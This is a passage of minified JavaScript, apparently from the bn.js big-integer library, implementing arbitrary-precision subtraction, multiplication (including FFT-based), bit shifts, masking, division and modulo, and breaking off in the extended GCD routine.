0!==t.negative&&0===this.negative?(t.negative=0,e=this.sub(t),t.negative^=1,e):0===t.negative&&0!==this.negative?(this.negative=0,e=t.sub(this),this.negative=1,e):this.length>t.length?this.clone().iadd(t):t.clone().iadd(this)},o.prototype.isub=function(t){if(0!==t.negative){t.negative=0;var e=this.iadd(t);return t.negative=1,e._normSign()}if(0!==this.negative)return this.negative=0,this.iadd(t),this.negative=1,this._normSign();var r,n,i=this.cmp(t);if(0===i)return this.negative=0,this.length=1,this.words[0]=0,this;i>0?(r=this,n=t):(r=t,n=this);for(var o=0,s=0;s<n.length;s++)o=(e=(0|r.words[s])-(0|n.words[s])+o)>>26,this.words[s]=67108863&e;for(;0!==o&&s<r.length;s++)o=(e=(0|r.words[s])+o)>>26,this.words[s]=67108863&e;if(0===o&&s<r.length&&r!==this)for(;s<r.length;s++)this.words[s]=r.words[s];return this.length=Math.max(this.length,s),r!==this&&(this.negative=1),this._strip()},o.prototype.sub=function(t){return this.clone().isub(t)};var m=function(t,e,r){var n,i,o,s=t.words,a=e.words,c=r.words,u=0,h=0|s[0],l=8191&h,f=h>>>13,d=0|s[1],p=8191&d,g=d>>>13,m=0|s[2],y=8191&m,w=m>>>13,b=0|s[3],v=8191&b,k=b>>>13,S=0|s[4],A=8191&S,E=S>>>13,_=0|s[5],B=8191&_,I=_>>>13,x=0|s[6],M=8191&x,O=x>>>13,T=0|s[7],R=8191&T,P=T>>>13,C=0|s[8],L=8191&C,N=C>>>13,U=0|s[9],z=8191&U,D=U>>>13,j=0|a[0],W=8191&j,q=j>>>13,F=0|a[1],H=8191&F,K=F>>>13,$=0|a[2],V=8191&$,G=$>>>13,J=0|a[3],Z=8191&J,Y=J>>>13,X=0|a[4],Q=8191&X,tt=X>>>13,et=0|a[5],rt=8191&et,nt=et>>>13,it=0|a[6],ot=8191&it,st=it>>>13,at=0|a[7],ct=8191&at,ut=at>>>13,ht=0|a[8],lt=8191&ht,ft=ht>>>13,dt=0|a[9],pt=8191&dt,gt=dt>>>13;r.negative=t.negative^e.negative,r.length=19;var mt=(u+(n=Math.imul(l,W))|0)+((8191&(i=(i=Math.imul(l,q))+Math.imul(f,W)|0))<<13)|0;u=((o=Math.imul(f,q))+(i>>>13)|0)+(mt>>>26)|0,mt&=67108863,n=Math.imul(p,W),i=(i=Math.imul(p,q))+Math.imul(g,W)|0,o=Math.imul(g,q);var yt=(u+(n=n+Math.imul(l,H)|0)|0)+((8191&(i=(i=i+Math.imul(l,K)|0)+Math.imul(f,H)|0))<<13)|0;u=((o=o+Math.imul(f,K)|0)+(i>>>13)|0)+(yt>>>26)|0,yt&=67108863,n=Math.imul(y,W),i=(i=Math.imul(y,q))+Math.imul(w,W)|0,o=Math.imul(w,q),n=n+Math.imul(p,H)|0,i=(i=i+Math.imul(p,K)|0)+Math.imul(g,H)|0,o=o+Math.imul(g,K)|0;var wt=(u+(n=n+Math.imul(l,V)|0)|0)+((8191&(i=(i=i+Math.imul(l,G)|0)+Math.imul(f,V)|0))<<13)|0;u=((o=o+Math.imul(f,G)|0)+(i>>>13)|0)+(wt>>>26)|0,wt&=67108863,n=Math.imul(v,W),i=(i=Math.imul(v,q))+Math.imul(k,W)|0,o=Math.imul(k,q),n=n+Math.imul(y,H)|0,i=(i=i+Math.imul(y,K)|0)+Math.imul(w,H)|0,o=o+Math.imul(w,K)|0,n=n+Math.imul(p,V)|0,i=(i=i+Math.imul(p,G)|0)+Math.imul(g,V)|0,o=o+Math.imul(g,G)|0;var bt=(u+(n=n+Math.imul(l,Z)|0)|0)+((8191&(i=(i=i+Math.imul(l,Y)|0)+Math.imul(f,Z)|0))<<13)|0;u=((o=o+Math.imul(f,Y)|0)+(i>>>13)|0)+(bt>>>26)|0,bt&=67108863,n=Math.imul(A,W),i=(i=Math.imul(A,q))+Math.imul(E,W)|0,o=Math.imul(E,q),n=n+Math.imul(v,H)|0,i=(i=i+Math.imul(v,K)|0)+Math.imul(k,H)|0,o=o+Math.imul(k,K)|0,n=n+Math.imul(y,V)|0,i=(i=i+Math.imul(y,G)|0)+Math.imul(w,V)|0,o=o+Math.imul(w,G)|0,n=n+Math.imul(p,Z)|0,i=(i=i+Math.imul(p,Y)|0)+Math.imul(g,Z)|0,o=o+Math.imul(g,Y)|0;var vt=(u+(n=n+Math.imul(l,Q)|0)|0)+((8191&(i=(i=i+Math.imul(l,tt)|0)+Math.imul(f,Q)|0))<<13)|0;u=((o=o+Math.imul(f,tt)|0)+(i>>>13)|0)+(vt>>>26)|0,vt&=67108863,n=Math.imul(B,W),i=(i=Math.imul(B,q))+Math.imul(I,W)|0,o=Math.imul(I,q),n=n+Math.imul(A,H)|0,i=(i=i+Math.imul(A,K)|0)+Math.imul(E,H)|0,o=o+Math.imul(E,K)|0,n=n+Math.imul(v,V)|0,i=(i=i+Math.imul(v,G)|0)+Math.imul(k,V)|0,o=o+Math.imul(k,G)|0,n=n+Math.imul(y,Z)|0,i=(i=i+Math.imul(y,Y)|0)+Math.imul(w,Z)|0,o=o+Math.imul(w,Y)|0,n=n+Math.imul(p,Q)|0,i=(i=i+Math.imul(p,tt)|0)+Math.imul(g,Q)|0,o=o+Math.imul(g,tt)|0;var kt=(u+(n=n+Math.imul(l,rt)|0)|0)+((8191&(i=(i=i+Math.imul(l,nt)|0)+Math.imul(f,rt)|0))<<13)|0;u=((o=o+Math.imul(f,nt)|0)+(i>>>13)|0)+(kt>>>26)|0,kt&=67108863,n=Math.imul(M,W),i=(i=Math.imul(M,q))+Math.imul(O,W)|0,o=Math.imul(O,q),n=n+Math.imul(B,H)|0,i=(i=i+Math.imul(B,K)|0)+Math.imul(I,H)|0,o=o+Math.imul(I,K)|0,n=n+Math.imul(A,V)|0,i=(i=i+Math.imul(A,G)|0)+Math.imul(E,V)|0,o=o+Math.imul(E,G)|0,n=n+Math.imul(v,Z)|0,i=(i=i+Math.imul(v,Y)|0)+Math.imul(k,Z)|0,o=o+Math.imul(k,Y)|0,n=n+Math.imul(y,Q)|0,i=(i=i+Math.imul(y,tt)|0)+Math.imul(w,Q)|0,o=o+Math.imul(w,tt)|0,n=n+Math.imul(p,rt)|0,i=(i=i+Math.imul(p,nt)|0)+Math.imul(g,rt)|0,o=o+Math.imul(g,nt)|0;var St=(u+(n=n+Math.imul(l,ot)|0)|0)+((8191&(i=(i=i+Math.imul(l,st)|0)+Math.imul(f,ot)|0))<<13)|0;u=((o=o+Math.imul(f,st)|0)+(i>>>13)|0)+(St>>>26)|0,St&=67108863,n=Math.imul(R,W),i=(i=Math.imul(R,q))+Math.imul(P,W)|0,o=Math.imul(P,q),n=n+Math.imul(M,H)|0,i=(i=i+Math.imul(M,K)|0)+Math.imul(O,H)|0,o=o+Math.imul(O,K)|0,n=n+Math.imul(B,V)|0,i=(i=i+Math.imul(B,G)|0)+Math.imul(I,V)|0,o=o+Math.imul(I,G)|0,n=n+Math.imul(A,Z)|0,i=(i=i+Math.imul(A,Y)|0)+Math.imul(E,Z)|0,o=o+Math.imul(E,Y)|0,n=n+Math.imul(v,Q)|0,i=(i=i+Math.imul(v,tt)|0)+Math.imul(k,Q)|0,o=o+Math.imul(k,tt)|0,n=n+Math.imul(y,rt)|0,i=(i=i+Math.imul(y,nt)|0)+Math.imul(w,rt)|0,o=o+Math.imul(w,nt)|0,n=n+Math.imul(p,ot)|0,i=(i=i+Math.imul(p,st)|0)+Math.imul(g,ot)|0,o=o+Math.imul(g,st)|0;var At=(u+(n=n+Math.imul(l,ct)|0)|0)+((8191&(i=(i=i+Math.imul(l,ut)|0)+Math.imul(f,ct)|0))<<13)|0;u=((o=o+Math.imul(f,ut)|0)+(i>>>13)|0)+(At>>>26)|0,At&=67108863,n=Math.imul(L,W),i=(i=Math.imul(L,q))+Math.imul(N,W)|0,o=Math.imul(N,q),n=n+Math.imul(R,H)|0,i=(i=i+Math.imul(R,K)|0)+Math.imul(P,H)|0,o=o+Math.imul(P,K)|0,n=n+Math.imul(M,V)|0,i=(i=i+Math.imul(M,G)|0)+Math.imul(O,V)|0,o=o+Math.imul(O,G)|0,n=n+Math.imul(B,Z)|0,i=(i=i+Math.imul(B,Y)|0)+Math.imul(I,Z)|0,o=o+Math.imul(I,Y)|0,n=n+Math.imul(A,Q)|0,i=(i=i+Math.imul(A,tt)|0)+Math.imul(E,Q)|0,o=o+Math.imul(E,tt)|0,n=n+Math.imul(v,rt)|0,i=(i=i+Math.imul(v,nt)|0)+Math.imul(k,rt)|0,o=o+Math.imul(k,nt)|0,n=n+Math.imul(y,ot)|0,i=(i=i+Math.imul(y,st)|0)+Math.imul(w,ot)|0,o=o+Math.imul(w,st)|0,n=n+Math.imul(p,ct)|0,i=(i=i+Math.imul(p,ut)|0)+Math.imul(g,ct)|0,o=o+Math.imul(g,ut)|0;var Et=(u+(n=n+Math.imul(l,lt)|0)|0)+((8191&(i=(i=i+Math.imul(l,ft)|0)+Math.imul(f,lt)|0))<<13)|0;u=((o=o+Math.imul(f,ft)|0)+(i>>>13)|0)+(Et>>>26)|0,Et&=67108863,n=Math.imul(z,W),i=(i=Math.imul(z,q))+Math.imul(D,W)|0,o=Math.imul(D,q),n=n+Math.imul(L,H)|0,i=(i=i+Math.imul(L,K)|0)+Math.imul(N,H)|0,o=o+Math.imul(N,K)|0,n=n+Math.imul(R,V)|0,i=(i=i+Math.imul(R,G)|0)+Math.imul(P,V)|0,o=o+Math.imul(P,G)|0,n=n+Math.imul(M,Z)|0,i=(i=i+Math.imul(M,Y)|0)+Math.imul(O,Z)|0,o=o+Math.imul(O,Y)|0,n=n+Math.imul(B,Q)|0,i=(i=i+Math.imul(B,tt)|0)+Math.imul(I,Q)|0,o=o+Math.imul(I,tt)|0,n=n+Math.imul(A,rt)|0,i=(i=i+Math.imul(A,nt)|0)+Math.imul(E,rt)|0,o=o+Math.imul(E,nt)|0,n=n+Math.imul(v,ot)|0,i=(i=i+Math.imul(v,st)|0)+Math.imul(k,ot)|0,o=o+Math.imul(k,st)|0,n=n+Math.imul(y,ct)|0,i=(i=i+Math.imul(y,ut)|0)+Math.imul(w,ct)|0,o=o+Math.imul(w,ut)|0,n=n+Math.imul(p,lt)|0,i=(i=i+Math.imul(p,ft)|0)+Math.imul(g,lt)|0,o=o+Math.imul(g,ft)|0;var _t=(u+(n=n+Math.imul(l,pt)|0)|0)+((8191&(i=(i=i+Math.imul(l,gt)|0)+Math.imul(f,pt)|0))<<13)|0;u=((o=o+Math.imul(f,gt)|0)+(i>>>13)|0)+(_t>>>26)|0,_t&=67108863,n=Math.imul(z,H),i=(i=Math.imul(z,K))+Math.imul(D,H)|0,o=Math.imul(D,K),n=n+Math.imul(L,V)|0,i=(i=i+Math.imul(L,G)|0)+Math.imul(N,V)|0,o=o+Math.imul(N,G)|0,n=n+Math.imul(R,Z)|0,i=(i=i+Math.imul(R,Y)|0)+Math.imul(P,Z)|0,o=o+Math.imul(P,Y)|0,n=n+Math.imul(M,Q)|0,i=(i=i+Math.imul(M,tt)|0)+Math.imul(O,Q)|0,o=o+Math.imul(O,tt)|0,n=n+Math.imul(B,rt)|0,i=(i=i+Math.imul(B,nt)|0)+Math.imul(I,rt)|0,o=o+Math.imul(I,nt)|0,n=n+Math.imul(A,ot)|0,i=(i=i+Math.imul(A,st)|0)+Math.imul(E,ot)|0,o=o+Math.imul(E,st)|0,n=n+Math.imul(v,ct)|0,i=(i=i+Math.imul(v,ut)|0)+Math.imul(k,ct)|0,o=o+Math.imul(k,ut)|0,n=n+Math.imul(y,lt)|0,i=(i=i+Math.imul(y,ft)|0)+Math.imul(w,lt)|0,o=o+Math.imul(w,ft)|0;var Bt=(u+(n=n+Math.imul(p,pt)|0)|0)+((8191&(i=(i=i+Math.imul(p,gt)|0)+Math.imul(g,pt)|0))<<13)|0;u=((o=o+Math.imul(g,gt)|0)+(i>>>13)|0)+(Bt>>>26)|0,Bt&=67108863,n=Math.imul(z,V),i=(i=Math.imul(z,G))+Math.imul(D,V)|0,o=Math.imul(D,G),n=n+Math.imul(L,Z)|0,i=(i=i+Math.imul(L,Y)|0)+Math.imul(N,Z)|0,o=o+Math.imul(N,Y)|0,n=n+Math.imul(R,Q)|0,i=(i=i+Math.imul(R,tt)|0)+Math.imul(P,Q)|0,o=o+Math.imul(P,tt)|0,n=n+Math.imul(M,rt)|0,i=(i=i+Math.imul(M,nt)|0)+Math.imul(O,rt)|0,o=o+Math.imul(O,nt)|0,n=n+Math.imul(B,ot)|0,i=(i=i+Math.imul(B,st)|0)+Math.imul(I,ot)|0,o=o+Math.imul(I,st)|0,n=n+Math.imul(A,ct)|0,i=(i=i+Math.imul(A,ut)|0)+Math.imul(E,ct)|0,o=o+Math.imul(E,ut)|0,n=n+Math.imul(v,lt)|0,i=(i=i+Math.imul(v,ft)|0)+Math.imul(k,lt)|0,o=o+Math.imul(k,ft)|0;var It=(u+(n=n+Math.imul(y,pt)|0)|0)+((8191&(i=(i=i+Math.imul(y,gt)|0)+Math.imul(w,pt)|0))<<13)|0;u=((o=o+Math.imul(w,gt)|0)+(i>>>13)|0)+(It>>>26)|0,It&=67108863,n=Math.imul(z,Z),i=(i=Math.imul(z,Y))+Math.imul(D,Z)|0,o=Math.imul(D,Y),n=n+Math.imul(L,Q)|0,i=(i=i+Math.imul(L,tt)|0)+Math.imul(N,Q)|0,o=o+Math.imul(N,tt)|0,n=n+Math.imul(R,rt)|0,i=(i=i+Math.imul(R,nt)|0)+Math.imul(P,rt)|0,o=o+Math.imul(P,nt)|0,n=n+Math.imul(M,ot)|0,i=(i=i+Math.imul(M,st)|0)+Math.imul(O,ot)|0,o=o+Math.imul(O,st)|0,n=n+Math.imul(B,ct)|0,i=(i=i+Math.imul(B,ut)|0)+Math.imul(I,ct)|0,o=o+Math.imul(I,ut)|0,n=n+Math.imul(A,lt)|0,i=(i=i+Math.imul(A,ft)|0)+Math.imul(E,lt)|0,o=o+Math.imul(E,ft)|0;var xt=(u+(n=n+Math.imul(v,pt)|0)|0)+((8191&(i=(i=i+Math.imul(v,gt)|0)+Math.imul(k,pt)|0))<<13)|0;u=((o=o+Math.imul(k,gt)|0)+(i>>>13)|0)+(xt>>>26)|0,xt&=67108863,n=Math.imul(z,Q),i=(i=Math.imul(z,tt))+Math.imul(D,Q)|0,o=Math.imul(D,tt),n=n+Math.imul(L,rt)|0,i=(i=i+Math.imul(L,nt)|0)+Math.imul(N,rt)|0,o=o+Math.imul(N,nt)|0,n=n+Math.imul(R,ot)|0,i=(i=i+Math.imul(R,st)|0)+Math.imul(P,ot)|0,o=o+Math.imul(P,st)|0,n=n+Math.imul(M,ct)|0,i=(i=i+Math.imul(M,ut)|0)+Math.imul(O,ct)|0,o=o+Math.imul(O,ut)|0,n=n+Math.imul(B,lt)|0,i=(i=i+Math.imul(B,ft)|0)+Math.imul(I,lt)|0,o=o+Math.imul(I,ft)|0;var Mt=(u+(n=n+Math.imul(A,pt)|0)|0)+((8191&(i=(i=i+Math.imul(A,gt)|0)+Math.imul(E,pt)|0))<<13)|0;u=((o=o+Math.imul(E,gt)|0)+(i>>>13)|0)+(Mt>>>26)|0,Mt&=67108863,n=Math.imul(z,rt),i=(i=Math.imul(z,nt))+Math.imul(D,rt)|0,o=Math.imul(D,nt),n=n+Math.imul(L,ot)|0,i=(i=i+Math.imul(L,st)|0)+Math.imul(N,ot)|0,o=o+Math.imul(N,st)|0,n=n+Math.imul(R,ct)|0,i=(i=i+Math.imul(R,ut)|0)+Math.imul(P,ct)|0,o=o+Math.imul(P,ut)|0,n=n+Math.imul(M,lt)|0,i=(i=i+Math.imul(M,ft)|0)+Math.imul(O,lt)|0,o=o+Math.imul(O,ft)|0;var Ot=(u+(n=n+Math.imul(B,pt)|0)|0)+((8191&(i=(i=i+Math.imul(B,gt)|0)+Math.imul(I,pt)|0))<<13)|0;u=((o=o+Math.imul(I,gt)|0)+(i>>>13)|0)+(Ot>>>26)|0,Ot&=67108863,n=Math.imul(z,ot),i=(i=Math.imul(z,st))+Math.imul(D,ot)|0,o=Math.imul(D,st),n=n+Math.imul(L,ct)|0,i=(i=i+Math.imul(L,ut)|0)+Math.imul(N,ct)|0,o=o+Math.imul(N,ut)|0,n=n+Math.imul(R,lt)|0,i=(i=i+Math.imul(R,ft)|0)+Math.imul(P,lt)|0,o=o+Math.imul(P,ft)|0;var Tt=(u+(n=n+Math.imul(M,pt)|0)|0)+((8191&(i=(i=i+Math.imul(M,gt)|0)+Math.imul(O,pt)|0))<<13)|0;u=((o=o+Math.imul(O,gt)|0)+(i>>>13)|0)+(Tt>>>26)|0,Tt&=67108863,n=Math.imul(z,ct),i=(i=Math.imul(z,ut))+Math.imul(D,ct)|0,o=Math.imul(D,ut),n=n+Math.imul(L,lt)|0,i=(i=i+Math.imul(L,ft)|0)+Math.imul(N,lt)|0,o=o+Math.imul(N,ft)|0;var Rt=(u+(n=n+Math.imul(R,pt)|0)|0)+((8191&(i=(i=i+Math.imul(R,gt)|0)+Math.imul(P,pt)|0))<<13)|0;u=((o=o+Math.imul(P,gt)|0)+(i>>>13)|0)+(Rt>>>26)|0,Rt&=67108863,n=Math.imul(z,lt),i=(i=Math.imul(z,ft))+Math.imul(D,lt)|0,o=Math.imul(D,ft);var Pt=(u+(n=n+Math.imul(L,pt)|0)|0)+((8191&(i=(i=i+Math.imul(L,gt)|0)+Math.imul(N,pt)|0))<<13)|0;u=((o=o+Math.imul(N,gt)|0)+(i>>>13)|0)+(Pt>>>26)|0,Pt&=67108863;var Ct=(u+(n=Math.imul(z,pt))|0)+((8191&(i=(i=Math.imul(z,gt))+Math.imul(D,pt)|0))<<13)|0;return u=((o=Math.imul(D,gt))+(i>>>13)|0)+(Ct>>>26)|0,Ct&=67108863,c[0]=mt,c[1]=yt,c[2]=wt,c[3]=bt,c[4]=vt,c[5]=kt,c[6]=St,c[7]=At,c[8]=Et,c[9]=_t,c[10]=Bt,c[11]=It,c[12]=xt,c[13]=Mt,c[14]=Ot,c[15]=Tt,c[16]=Rt,c[17]=Pt,c[18]=Ct,0!==u&&(c[19]=u,r.length++),r};function y(t,e,r){r.negative=e.negative^t.negative,r.length=t.length+e.length;for(var n=0,i=0,o=0;o<r.length-1;o++){var s=i;i=0;for(var a=67108863&n,c=Math.min(o,e.length-1),u=Math.max(0,o-t.length+1);u<=c;u++){var h=o-u,l=(0|t.words[h])*(0|e.words[u]),f=67108863&l;a=67108863&(f=f+a|0),i+=(s=(s=s+(l/67108864|0)|0)+(f>>>26)|0)>>>26,s&=67108863}r.words[o]=a,n=s,s=i}return 0!==n?r.words[o]=n:r.length--,r._strip()}function w(t,e,r){return y(t,e,r)}function b(t,e){this.x=t,this.y=e}Math.imul||(m=g),o.prototype.mulTo=function(t,e){var r=this.length+t.length;return 10===this.length&&10===t.length?m(this,t,e):r<63?g(this,t,e):r<1024?y(this,t,e):w(this,t,e)},b.prototype.makeRBT=function(t){for(var e=new Array(t),r=o.prototype._countBits(t)-1,n=0;n<t;n++)e[n]=this.revBin(n,r,t);return e},b.prototype.revBin=function(t,e,r){if(0===t||t===r-1)return t;for(var n=0,i=0;i<e;i++)n|=(1&t)<<e-i-1,t>>=1;return n},b.prototype.permute=function(t,e,r,n,i,o){for(var s=0;s<o;s++)n[s]=e[t[s]],i[s]=r[t[s]]},b.prototype.transform=function(t,e,r,n,i,o){this.permute(o,t,e,r,n,i);for(var s=1;s<i;s<<=1)for(var a=s<<1,c=Math.cos(2*Math.PI/a),u=Math.sin(2*Math.PI/a),h=0;h<i;h+=a)for(var l=c,f=u,d=0;d<s;d++){var p=r[h+d],g=n[h+d],m=r[h+d+s],y=n[h+d+s],w=l*m-f*y;y=l*y+f*m,m=w,r[h+d]=p+m,n[h+d]=g+y,r[h+d+s]=p-m,n[h+d+s]=g-y,d!==a&&(w=c*l-u*f,f=c*f+u*l,l=w)}},b.prototype.guessLen13b=function(t,e){var r=1|Math.max(e,t),n=1&r,i=0;for(r=r/2|0;r;r>>>=1)i++;return 1<<i+1+n},b.prototype.conjugate=function(t,e,r){if(!(r<=1))for(var n=0;n<r/2;n++){var i=t[n];t[n]=t[r-n-1],t[r-n-1]=i,i=e[n],e[n]=-e[r-n-1],e[r-n-1]=-i}},b.prototype.normalize13b=function(t,e){for(var r=0,n=0;n<e/2;n++){var i=8192*Math.round(t[2*n+1]/e)+Math.round(t[2*n]/e)+r;t[n]=67108863&i,r=i<67108864?0:i/67108864|0}return t},b.prototype.convert13b=function(t,e,r,i){for(var o=0,s=0;s<e;s++)o+=0|t[s],r[2*s]=8191&o,o>>>=13,r[2*s+1]=8191&o,o>>>=13;for(s=2*e;s<i;++s)r[s]=0;n(0===o),n(!(-8192&o))},b.prototype.stub=function(t){for(var e=new Array(t),r=0;r<t;r++)e[r]=0;return e},b.prototype.mulp=function(t,e,r){var n=2*this.guessLen13b(t.length,e.length),i=this.makeRBT(n),o=this.stub(n),s=new Array(n),a=new Array(n),c=new Array(n),u=new Array(n),h=new Array(n),l=new Array(n),f=r.words;f.length=n,this.convert13b(t.words,t.length,s,n),this.convert13b(e.words,e.length,u,n),this.transform(s,o,a,c,n,i),this.transform(u,o,h,l,n,i);for(var d=0;d<n;d++){var p=a[d]*h[d]-c[d]*l[d];c[d]=a[d]*l[d]+c[d]*h[d],a[d]=p}return this.conjugate(a,c,n),this.transform(a,c,f,o,n,i),this.conjugate(f,o,n),this.normalize13b(f,n),r.negative=t.negative^e.negative,r.length=t.length+e.length,r._strip()},o.prototype.mul=function(t){var e=new o(null);return e.words=new Array(this.length+t.length),this.mulTo(t,e)},o.prototype.mulf=function(t){var e=new o(null);return e.words=new Array(this.length+t.length),w(this,t,e)},o.prototype.imul=function(t){return this.clone().mulTo(t,this)},o.prototype.imuln=function(t){var e=t<0;e&&(t=-t),n("number"==typeof t),n(t<67108864);for(var r=0,i=0;i<this.length;i++){var o=(0|this.words[i])*t,s=(67108863&o)+(67108863&r);r>>=26,r+=o/67108864|0,r+=s>>>26,this.words[i]=67108863&s}return 0!==r&&(this.words[i]=r,this.length++),e?this.ineg():this},o.prototype.muln=function(t){return this.clone().imuln(t)},o.prototype.sqr=function(){return this.mul(this)},o.prototype.isqr=function(){return this.imul(this.clone())},o.prototype.pow=function(t){var e=function(t){for(var e=new Array(t.bitLength()),r=0;r<e.length;r++){var n=r/26|0,i=r%26;e[r]=t.words[n]>>>i&1}return e}(t);if(0===e.length)return new o(1);for(var r=this,n=0;n<e.length&&0===e[n];n++,r=r.sqr());if(++n<e.length)for(var i=r.sqr();n<e.length;n++,i=i.sqr())0!==e[n]&&(r=r.mul(i));return r},o.prototype.iushln=function(t){n("number"==typeof t&&t>=0);var e,r=t%26,i=(t-r)/26,o=67108863>>>26-r<<26-r;if(0!==r){var s=0;for(e=0;e<this.length;e++){var a=this.words[e]&o,c=(0|this.words[e])-a<<r;this.words[e]=c|s,s=a>>>26-r}s&&(this.words[e]=s,this.length++)}if(0!==i){for(e=this.length-1;e>=0;e--)this.words[e+i]=this.words[e];for(e=0;e<i;e++)this.words[e]=0;this.length+=i}return this._strip()},o.prototype.ishln=function(t){return n(0===this.negative),this.iushln(t)},o.prototype.iushrn=function(t,e,r){var i;n("number"==typeof t&&t>=0),i=e?(e-e%26)/26:0;var o=t%26,s=Math.min((t-o)/26,this.length),a=67108863^67108863>>>o<<o,c=r;if(i-=s,i=Math.max(0,i),c){for(var u=0;u<s;u++)c.words[u]=this.words[u];c.length=s}if(0===s);else if(this.length>s)for(this.length-=s,u=0;u<this.length;u++)this.words[u]=this.words[u+s];else this.words[0]=0,this.length=1;var h=0;for(u=this.length-1;u>=0&&(0!==h||u>=i);u--){var l=0|this.words[u];this.words[u]=h<<26-o|l>>>o,h=l&a}return c&&0!==h&&(c.words[c.length++]=h),0===this.length&&(this.words[0]=0,this.length=1),this._strip()},o.prototype.ishrn=function(t,e,r){return n(0===this.negative),this.iushrn(t,e,r)},o.prototype.shln=function(t){return this.clone().ishln(t)},o.prototype.ushln=function(t){return this.clone().iushln(t)},o.prototype.shrn=function(t){return this.clone().ishrn(t)},o.prototype.ushrn=function(t){return this.clone().iushrn(t)},o.prototype.testn=function(t){n("number"==typeof t&&t>=0);var e=t%26,r=(t-e)/26,i=1<<e;return!(this.length<=r||!(this.words[r]&i))},o.prototype.imaskn=function(t){n("number"==typeof t&&t>=0);var e=t%26,r=(t-e)/26;if(n(0===this.negative,"imaskn works only with positive numbers"),this.length<=r)return this;if(0!==e&&r++,this.length=Math.min(r,this.length),0!==e){var i=67108863^67108863>>>e<<e;this.words[this.length-1]&=i}return this._strip()},o.prototype.maskn=function(t){return this.clone().imaskn(t)},o.prototype.iaddn=function(t){return n("number"==typeof t),n(t<67108864),t<0?this.isubn(-t):0!==this.negative?1===this.length&&(0|this.words[0])<=t?(this.words[0]=t-(0|this.words[0]),this.negative=0,this):(this.negative=0,this.isubn(t),this.negative=1,this):this._iaddn(t)},o.prototype._iaddn=function(t){this.words[0]+=t;for(var e=0;e<this.length&&this.words[e]>=67108864;e++)this.words[e]-=67108864,e===this.length-1?this.words[e+1]=1:this.words[e+1]++;return this.length=Math.max(this.length,e+1),this},o.prototype.isubn=function(t){if(n("number"==typeof t),n(t<67108864),t<0)return this.iaddn(-t);if(0!==this.negative)return this.negative=0,this.iaddn(t),this.negative=1,this;if(this.words[0]-=t,1===this.length&&this.words[0]<0)this.words[0]=-this.words[0],this.negative=1;else for(var e=0;e<this.length&&this.words[e]<0;e++)this.words[e]+=67108864,this.words[e+1]-=1;return this._strip()},o.prototype.addn=function(t){return this.clone().iaddn(t)},o.prototype.subn=function(t){return this.clone().isubn(t)},o.prototype.iabs=function(){return this.negative=0,this},o.prototype.abs=function(){return this.clone().iabs()},o.prototype._ishlnsubmul=function(t,e,r){var i,o,s=t.length+r;this._expand(s);var a=0;for(i=0;i<t.length;i++){o=(0|this.words[i+r])+a;var c=(0|t.words[i])*e;a=((o-=67108863&c)>>26)-(c/67108864|0),this.words[i+r]=67108863&o}for(;i<this.length-r;i++)a=(o=(0|this.words[i+r])+a)>>26,this.words[i+r]=67108863&o;if(0===a)return this._strip();for(n(-1===a),a=0,i=0;i<this.length;i++)a=(o=-(0|this.words[i])+a)>>26,this.words[i]=67108863&o;return this.negative=1,this._strip()},o.prototype._wordDiv=function(t,e){var r=(this.length,t.length),n=this.clone(),i=t,s=0|i.words[i.length-1];0!=(r=26-this._countBits(s))&&(i=i.ushln(r),n.iushln(r),s=0|i.words[i.length-1]);var a,c=n.length-i.length;if("mod"!==e){(a=new o(null)).length=c+1,a.words=new Array(a.length);for(var u=0;u<a.length;u++)a.words[u]=0}var h=n.clone()._ishlnsubmul(i,1,c);0===h.negative&&(n=h,a&&(a.words[c]=1));for(var l=c-1;l>=0;l--){var f=67108864*(0|n.words[i.length+l])+(0|n.words[i.length+l-1]);for(f=Math.min(f/s|0,67108863),n._ishlnsubmul(i,f,l);0!==n.negative;)f--,n.negative=0,n._ishlnsubmul(i,1,l),n.isZero()||(n.negative^=1);a&&(a.words[l]=f)}return a&&a._strip(),n._strip(),"div"!==e&&0!==r&&n.iushrn(r),{div:a||null,mod:n}},o.prototype.divmod=function(t,e,r){return n(!t.isZero()),this.isZero()?{div:new o(0),mod:new o(0)}:0!==this.negative&&0===t.negative?(a=this.neg().divmod(t,e),"mod"!==e&&(i=a.div.neg()),"div"!==e&&(s=a.mod.neg(),r&&0!==s.negative&&s.iadd(t)),{div:i,mod:s}):0===this.negative&&0!==t.negative?(a=this.divmod(t.neg(),e),"mod"!==e&&(i=a.div.neg()),{div:i,mod:a.mod}):this.negative&t.negative?(a=this.neg().divmod(t.neg(),e),"div"!==e&&(s=a.mod.neg(),r&&0!==s.negative&&s.isub(t)),{div:a.div,mod:s}):t.length>this.length||this.cmp(t)<0?{div:new o(0),mod:this}:1===t.length?"div"===e?{div:this.divn(t.words[0]),mod:null}:"mod"===e?{div:null,mod:new o(this.modrn(t.words[0]))}:{div:this.divn(t.words[0]),mod:new o(this.modrn(t.words[0]))}:this._wordDiv(t,e);var i,s,a},o.prototype.div=function(t){return this.divmod(t,"div",!1).div},o.prototype.mod=function(t){return this.divmod(t,"mod",!1).mod},o.prototype.umod=function(t){return this.divmod(t,"mod",!0).mod},o.prototype.divRound=function(t){var e=this.divmod(t);if(e.mod.isZero())return e.div;var r=0!==e.div.negative?e.mod.isub(t):e.mod,n=t.ushrn(1),i=t.andln(1),o=r.cmp(n);return o<0||1===i&&0===o?e.div:0!==e.div.negative?e.div.isubn(1):e.div.iaddn(1)},o.prototype.modrn=function(t){var e=t<0;e&&(t=-t),n(t<=67108863);for(var r=(1<<26)%t,i=0,o=this.length-1;o>=0;o--)i=(r*i+(0|this.words[o]))%t;return e?-i:i},o.prototype.modn=function(t){return this.modrn(t)},o.prototype.idivn=function(t){var e=t<0;e&&(t=-t),n(t<=67108863);for(var r=0,i=this.length-1;i>=0;i--){var o=(0|this.words[i])+67108864*r;this.words[i]=o/t|0,r=o%t}return this._strip(),e?this.ineg():this},o.prototype.divn=function(t){return this.clone().idivn(t)},o.prototype.egcd=function(t){n(0===t.negative),n(!t.isZero());var e=this,r=t.clone();e=0!==e.negative?e.umod(t):e.clone();for(var i=new o(1),s=new o(0),a=new o(0),c=new o(1),u=0;e.isEven()&&r.isEven();)e.iushrn(1),r.iushrn(1),++u;for(var h=r.clone(),l=e.clone();!e.isZero();){for(var f=0,d=1;!(e.words[0]&d)&&f<26;++f,d<<=1);if(f>0)for(e.iushrn(f);f-- >0;)(i.isOdd()||s.isOdd())&&(i.iadd(h),s.isub(l)),i.iushrn(1),s.iushrn(1);for(var p=0,g=1;!(r.words[0]&g)&&p<26;++p,g<<=1);if(p>0)for(r.iushrn(p);p-- 